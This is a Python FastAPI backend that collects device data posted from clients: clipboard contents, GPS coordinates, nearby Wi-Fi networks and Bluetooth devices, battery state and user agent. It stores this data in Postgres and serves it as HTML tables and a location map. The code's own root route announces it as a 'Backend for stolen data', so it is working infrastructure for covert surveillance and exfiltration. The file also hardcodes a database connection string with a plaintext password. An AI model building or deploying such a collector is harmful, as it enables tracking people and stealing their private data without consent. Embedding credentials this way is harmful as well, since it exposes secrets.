import psycopg2
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import json
import re
from datetime import datetime
from pydantic import BaseModel
from typing import List

app = FastAPI()

DATABASE_URL = "postgresql://frog_guard_prod_user:xJxHxbuPQ4jtQLbVyc3LaKdQnNtiV8nH@oregon-postgres.render.com:5432/frog_guard_prod"


class DeviceInfo(BaseModel):
    device_name: str
    os: str
    browser_user_agent: str


class Location(BaseModel):
    latitude: float
    longitude: float


class Wifi(BaseModel):
    ssid: str
    bssid: str
    signal_strength: int


class Bluetooth(BaseModel):
    device_name: str
    device_mac: str
    signal_strength: int


class DataModel(BaseModel):
    device_info: DeviceInfo
    location: Location
    wifi: List[Wifi]
    bluetooth: List[Bluetooth]
    clipboard: str
    battery_level: int
    charging: bool


class Report(BaseModel):
    category: str
    description: str
    location: Location


def get_connection():
    return psycopg2.connect(DATABASE_URL)


def fetch_records(table_name: str):
    if table_name not in {"device_info", "location", "bluetooth", "wifi", "report"}:
        raise ValueError("Invalid table name")

    conn = get_connection()
    cur = conn.cursor()
    query = f"SELECT * FROM prod.{table_name};"
    cur.execute(query)
    rows = cur.fetchall()
    cur.close()
    conn.close()
    return rows


def insert_into_db(table_name: str, columns: List[str], values: List[tuple]):
    columns_str = ", ".join(columns)
    placeholders = ", ".join(["%s"] * len(values[0]))
    query = f"INSERT INTO prod.{table_name} ({columns_str}) VALUES ({placeholders})"

    conn = get_connection()
    cur = conn.cursor()
    if len(values) == 1:
        cur.execute(query, values[0])
    else:
        cur.executemany(query, values)
    conn.commit()
    cur.close()
    conn.close()


def insert_report(report: Report):
    insert_into_db("report", ["category", "description", "latitude", "longitude"],
                   [(report.category, report.description, report.location.latitude, report.location.longitude)])


def insert_device_info(data: DataModel):
    insert_into_db("device_info", ["device_name", "os", "browser_user_agent", "clipboard", "battery_level", "charging"],
                   [(data.device_info.device_name, data.device_info.os, data.device_info.browser_user_agent,
                     data.clipboard, data.battery_level, data.charging)])


def insert_location(data: DataModel):
    insert_into_db("location", ["latitude", "longitude"], [(data.location.latitude, data.location.longitude)])


def insert_wifi(data: DataModel):
    wifi_values = [(wifi.ssid, wifi.bssid, wifi.signal_strength) for wifi in data.wifi]
    insert_into_db("wifi", ["ssid", "bssid", "signal_strength"], wifi_values)


def insert_bluetooth(data: DataModel):
    bluetooth_values = [(bluetooth.device_name, bluetooth.device_mac, bluetooth.signal_strength) for bluetooth in
                        data.bluetooth]
    insert_into_db("bluetooth", ["device_name", "device_mac", "signal_strength"], bluetooth_values)


def insert_record(data: DataModel):
    insert_location(data)
    insert_device_info(data)
    insert_wifi(data)
    insert_bluetooth(data)


@app.get("/")
def root():
    return "Backend for stolen data is running..."


@app.get("/device_info")
def get_device_info():
    return generate_html_table(fetch_records("device_info"),
                               ["ID", "Name", "OS", "Browser User Agent", "Clipboard", "Battery Level", "Charging",
                                "Timestamp"])


@app.get("/wifi")
def get_wifi():
    return generate_html_table(fetch_records("wifi"), ["ID", "SSID", "BSSID", "Signal Strength", "Timestamp"])


@app.get("/bluetooth")
def get_bluetooth():
    return generate_html_table(fetch_records("bluetooth"),
                               ["ID", "Name", "MAC Address", "Signal Strength", "Timestamp"])


def generate_html_table(records, columns):
    html_content = f"""
        <table border="1">
            <thead>
                <tr>
                    {''.join(f"<th>{col}</th>" for col in columns)}
                </tr>
            </thead>
            <tbody>
    """
    for row in records:
        html_content += "<tr>" + "".join(
            f"<td>{item if not isinstance(item, datetime) else item.strftime('%Y-%m-%d %H:%M UTC')}</td>" for item in
            row
        ) + "</tr>\n"

    html_content += "</tbody></table>"
    return HTMLResponse(content=html_content, status_code=200)


@app.get("/map", response_class=HTMLResponse)
async def serve_map():
    return update_html_with_data("map.html", fetch_records("location"))


@app.get("/incidents", response_class=HTMLResponse)
async def show_incidents():
    return update_html_with_data("incidents.html", fetch_records("report"))


def update_html_with_data(filename: str, data):
    if len(data[0]) == 4:
        converted_data = [
            [id_, lat, lon, timestamp.isoformat()]
            for id_, lat, lon, timestamp in data
        ]
    elif len(data[0]) == 6:
        converted_data = [
            [id_, cat, des, lat, lon, timestamp.isoformat()]
            for id_, cat, des, lat, lon, timestamp in data
        ]
    else:
        raise ValueError(f"Unexpected number of columns in row: {len(data[0])}, expected 4 or 6.")
    with open(filename, 'r', encoding='utf-8') as file:
        html_content = file.read()
    pattern = r'const locationData\s*=\s*(\[[\s\S]*?\]);'
    replacement_data = f"const locationData = {json.dumps(converted_data, indent=2)};"
    updated_html_content = re.sub(pattern, replacement_data, html_content)
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(updated_html_content)
    with open(filename, "r", encoding="utf-8") as file:
        return HTMLResponse(content=file.read(), status_code=200)


@app.post("/sisu")
def perkele(data: DataModel):
    insert_record(data)
    return data


@app.post("/report")
def post_report(report: Report):
    insert_report(report)
    return report
